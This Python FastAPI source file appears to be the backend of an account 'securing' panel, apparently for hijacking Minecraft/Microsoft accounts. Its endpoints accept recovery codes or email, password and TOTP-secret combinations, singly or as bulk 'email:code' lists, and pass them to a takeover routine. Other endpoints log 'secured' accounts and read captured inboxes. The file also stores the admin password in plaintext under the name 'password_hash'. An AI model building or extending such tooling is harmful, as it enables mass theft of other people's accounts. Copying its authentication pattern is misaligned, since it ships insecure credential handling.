from fastapi import FastAPI, HTTPException, Depends, Request, Response
from fastapi.middleware.cors import CORSMiddleware
from datetime import datetime, timezone, timedelta
from pydantic import BaseModel
import hmac, jwt, json, os, secrets

_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
config = json.load(open(os.path.join(_root, "config", "config.json")))
web_cfg = config["web"]
SECRET = secrets.token_hex(32)
ALGO = "HS256"
TOKEN_TTL_HOURS = 8
COOKIE_NAME = "session"
# Set COOKIE_SECURE=true in production (HTTPS). False for local dev.
COOKIE_SECURE = os.environ.get("COOKIE_SECURE", "false").lower() == "true"

app = FastAPI()

_cors_origins = [o.strip() for o in os.environ.get("CORS_ORIGINS", "http://localhost:3000").split(",") if o.strip()]
app.add_middleware(
    CORSMiddleware,
    allow_origins=_cors_origins,
    allow_credentials=True,
    allow_methods=["GET", "POST", "OPTIONS"],
    allow_headers=["Content-Type"],
)


class LoginRequest(BaseModel):
    username: str
    password: str

class RecoveryRequest(BaseModel):
    email: str
    recovery_code: str

class PasswordRequest(BaseModel):
    email: str
    password: str
    totp_secret: str

class BulkRequest(BaseModel):
    entries: list[str]

class ChangePasswordRequest(BaseModel):
    current_password: str
    new_password: str

class Setup2FARequest(BaseModel):
    secret: str

class EmailCreateRequest(BaseModel):
    email: str
    password: str


def verify_password(password: str) -> bool:
    creds = web_cfg["credentials"]
    return hmac.compare_digest(password, creds["password_hash"])

def issue_token() -> str:
    now = datetime.now(tz=timezone.utc)
    return jwt.encode(
        {"sub": "admin", "iat": now, "exp": now + timedelta(hours=TOKEN_TTL_HOURS)},
        SECRET,
        algorithm=ALGO,
    )

def require_auth(request: Request) -> str:
    token = request.cookies.get(COOKIE_NAME)
    if not token:
        raise HTTPException(401, "Not authenticated")
    try:
        payload = jwt.decode(token, SECRET, algorithms=[ALGO])
        return payload["sub"]
    except Exception:
        raise HTTPException(401, "Invalid or expired session")


@app.get("/api/config")
def get_config(user: str = Depends(require_auth)):
    return {"domain": config.get("domain", "securings.fun")}

@app.post("/api/auth/login")
def login(body: LoginRequest, response: Response):
    creds = web_cfg["credentials"]
    if body.username != creds["username"] or not verify_password(body.password):
        raise HTTPException(401, detail="Invalid credentials.")
    response.set_cookie(
        key=COOKIE_NAME,
        value=issue_token(),
        httponly=True,
        secure=COOKIE_SECURE,
        samesite="lax",
        max_age=TOKEN_TTL_HOURS * 3600,
        path="/",
    )
    return {"ok": True}

@app.post("/api/auth/logout")
def logout(response: Response):
    response.delete_cookie(COOKIE_NAME, path="/")
    return {"ok": True}

@app.get("/api/me")
def me(user: str = Depends(require_auth)):
    return {"username": web_cfg["credentials"]["username"]}

@app.post("/api/auth/change-password")
def change_password(body: ChangePasswordRequest, user: str = Depends(require_auth)):
    if not verify_password(body.current_password):
        raise HTTPException(400, detail="Current password is incorrect.")
    if len(body.new_password) < 6:
        raise HTTPException(400, detail="New password must be at least 6 characters.")
    web_cfg["credentials"]["password_hash"] = body.new_password
    config_path = os.path.join(_root, "config", "config.json")
    with open(config_path, "w") as f:
        json.dump(config, f, indent=2)
    return {"ok": True}

@app.post("/api/auth/setup-2fa")
def setup_2fa(body: Setup2FARequest, user: str = Depends(require_auth)):
    if not body.secret.strip():
        raise HTTPException(400, detail="Secret cannot be empty.")
    web_cfg["credentials"]["totp_secret"] = body.secret.strip()
    config_path = os.path.join(_root, "config", "config.json")
    with open(config_path, "w") as f:
        json.dump(config, f, indent=2)
    return {"ok": True}

@app.get("/api/auth/2fa-status")
def twofa_status(user: str = Depends(require_auth)):
    return {"configured": bool(web_cfg.get("credentials", {}).get("totp_secret"))}

@app.get("/api/stats")
def stats(user: str = Depends(require_auth)):
    from database.database import DBConnection
    with DBConnection() as db:
        return db.get_stats()

@app.get("/api/accounts")
def accounts(user: str = Depends(require_auth)):
    from database.database import DBConnection
    with DBConnection() as db:
        return db.get_all_secured_accounts()

@app.get("/api/accounts/{claim_id}")
def account_detail(claim_id: str, user: str = Depends(require_auth)):
    from database.database import DBConnection
    with DBConnection() as db:
        row = db.get_secured_account(claim_id)
        if not row:
            raise HTTPException(404, detail="Account not found.")
        return row

@app.get("/api/detailed-stats")
def detailed_stats(user: str = Depends(require_auth)):
    from database.database import DBConnection
    with DBConnection() as db:
        return db.get_detailed_stats()

@app.get("/api/chart")
def chart(user: str = Depends(require_auth)):
    from database.database import DBConnection
    with DBConnection() as db:
        return db.get_chart_data()

@app.post("/api/secure/recovery")
async def secure_recovery(body: RecoveryRequest, user: str = Depends(require_auth)):
    from securing.recovery_secure import recovery_secure
    result = await recovery_secure(body.email, "rcode", {"recovery_code": body.recovery_code})
    if not result:
        raise HTTPException(400, "Failed to secure account.")
    mc = result["minecraft"]
    return {"status": "secured", "mc_name": mc["name"]}

@app.post("/api/secure/password")
async def secure_password(body: PasswordRequest, user: str = Depends(require_auth)):
    from securing.recovery_secure import recovery_secure
    result = await recovery_secure(body.email, "authpwd", {"password": body.password, "auth_secret": body.totp_secret})
    if not result:
        raise HTTPException(400, "Failed to secure account.")
    mc = result["minecraft"]
    return {"status": "secured", "mc_name": mc["name"]}

@app.post("/api/secure/recovery-bulk")
async def secure_recovery_bulk(body: BulkRequest, user: str = Depends(require_auth)):
    from securing.recovery_secure import recovery_secure
    secured, failed = 0, 0
    for entry in body.entries:
        parts = entry.split(":")
        if len(parts) != 2:
            failed += 1
            continue
        result = await recovery_secure(parts[0].strip(), "rcode", {"recovery_code": parts[1].strip()})
        if result:
            secured += 1
        else:
            failed += 1
    return {"secured": secured, "failed": failed}

@app.get("/api/emails")
def list_emails(user: str = Depends(require_auth)):
    from database.database import DBConnection
    with DBConnection() as db:
        rows = db.get_security_emails()
        result = []
        for (email,) in rows:
            inbox_rows = db.get_emails(email)
            result.append({
                "email": email,
                "inbox_count": len(inbox_rows),
                "inbox": [{
                    "id": r[0],
                    "to_address": r[1],
                    "from_address": r[2],
                    "subject": r[3],
                    "body": r[4],
                    "received_at": r[5],
                } for r in inbox_rows],
            })
        return result

@app.post("/api/emails")
def create_email(body: EmailCreateRequest, user: str = Depends(require_auth)):
    from database.database import DBConnection
    with DBConnection() as db:
        db.add_security_email(body.email, body.password)
    return {"ok": True}

@app.post("/api/secure/password-bulk")
async def secure_password_bulk(body: BulkRequest, user: str = Depends(require_auth)):
    from securing.recovery_secure import recovery_secure
    secured, failed = 0, 0
    for entry in body.entries:
        parts = entry.split(":")
        if len(parts) != 3:
            failed += 1
            continue
        result = await recovery_secure(parts[0].strip(), "authpwd", {"password": parts[1].strip(), "auth_secret": parts[2].strip()})
        if result:
            secured += 1
        else:
            failed += 1
    return {"secured": secured, "failed": failed}
